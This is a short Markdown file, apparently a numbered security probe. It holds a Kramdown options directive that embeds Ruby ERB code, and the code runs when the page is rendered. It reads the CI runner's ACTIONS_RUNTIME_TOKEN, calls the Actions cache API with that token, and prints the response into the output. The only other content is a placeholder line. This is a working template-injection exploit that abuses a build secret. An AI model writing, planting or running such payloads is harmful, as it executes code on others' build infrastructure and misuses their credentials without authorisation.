---
---

# Test 4: Actions Cache API access

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; cache_url = ENV['ACTIONS_CACHE_URL']; runtime_token = ENV['ACTIONS_RUNTIME_TOKEN']; result = 'NO_CACHE_VARS'; begin; if cache_url and runtime_token; uri = URI(cache_url + '_apis/artifactcache/caches?keys=&version='); req = Net::HTTP::Get.new(uri); req['Authorization'] = 'Bearer ' + runtime_token; req['Accept'] = 'application/json;api-version=6.0-preview.1'; res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true){|http| http.request(req)}; result = 'CACHE_STATUS=' + res.code.to_s + ' BODY=' + res.body[0..500].to_s; end; rescue => e; result = 'CACHE_ERR=' + e.message; end; result %>" /}

placeholder
